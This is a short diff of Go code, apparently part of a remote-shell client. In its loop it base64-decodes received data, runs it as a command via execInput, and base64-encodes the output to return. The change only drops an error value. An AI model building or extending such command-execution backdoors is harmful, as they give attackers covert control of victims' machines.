@@ -138,7 +138,7 @@ func main() {
 		}
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		//fmt.Println("$ " + string(sDec))
-		resp, err := execInput(string(sDec))
+		resp := execInput(string(sDec))
 		//fmt.Println(resp)
 		time.Sleep(time.Second)
 		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
